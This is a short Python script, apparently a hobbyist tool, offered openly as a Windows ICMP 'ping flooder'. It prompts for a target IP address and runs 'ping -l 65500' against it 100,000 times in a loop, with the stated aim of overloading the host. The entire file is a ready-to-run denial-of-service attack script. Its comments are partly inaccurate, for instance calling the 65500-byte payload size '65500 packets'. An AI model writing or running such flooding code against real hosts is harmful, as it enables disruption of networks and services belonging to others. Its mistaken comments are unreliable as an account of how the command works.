import os
import time

"""
low-level ping flooder for WINDOWS; you need an ip
"""

__author__ = "seasaltWagyu"

def ping_flood(ip: int):  #ip to ping flood is required
    
    """
    the actual ping flooding functions that sends packets to the desired ip,
    attempting to overload it (pretty useless against modern firewalls)
    """
    
    time.sleep(1)   #time delay in pinging
    os.system(f'ping -l 65500 {ip}')   #pinging with 65500 packets

def main():
    
    """
    main function, to ask user which ip they want to ping flood
    """
    
    which_ip = input("Which IP address would you like to flood with ICMP packets?")  #asking for user input for ip
    
    for i in range(10 * 10**4):  #scientific notation for 100,000
        ping_flood(which_ip)



if __name__ == "__main__":   #so that won't run automatically if imported as a module to another script
    main()
